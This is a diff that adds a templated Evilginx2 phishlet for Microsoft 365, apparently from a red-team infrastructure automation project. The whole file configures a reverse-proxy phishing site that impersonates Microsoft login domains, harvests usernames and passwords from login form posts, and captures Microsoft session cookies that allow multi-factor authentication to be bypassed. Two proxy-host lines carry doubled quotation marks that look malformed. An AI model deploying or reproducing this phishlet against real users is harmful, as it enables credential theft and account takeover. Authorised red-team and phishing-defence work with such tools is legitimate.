@@ -1,0 +1,26 @@
+{% for vm in warhorse.vm|selectattr("evilginx2", "defined" ) %}
+name: "Microsoft 365 Enterprise"
+min_ver: '3.2.0'
+redirect_url: 'https://office.com'
+proxy_hosts:
+  - {phish_sub: '{{ vm.evilginx2.o365.login_hostname }}', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: '{{ vm.evilginx2.o365.www_hostname }}', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: ''{{ vm.evilginx2.o365.aadcdn_hostname }}'', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false}
+  - {phish_sub: ''{{ vm.evilginx2.o365.sso_hostname }}'', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+{% endfor %}
